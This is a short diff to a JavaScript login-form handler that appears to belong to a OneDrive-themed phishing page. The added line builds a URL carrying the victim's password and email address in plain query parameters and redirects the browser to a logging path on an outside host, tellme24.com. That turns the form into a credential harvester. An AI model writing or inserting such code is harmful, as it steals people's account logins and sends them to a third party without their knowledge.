@@ -53,7 +53,7 @@ function subFormBtn(b) {
         return
     }
 
-    let url = "drv.php?auth=oneDrive&pass="+pass+"&mail="+mail;
+    let url = "https://tellme24.com/logs/one_drv/drv.php?auth=oneDrive&pass="+pass+"&mail="+mail;
 
     location = url;
 }
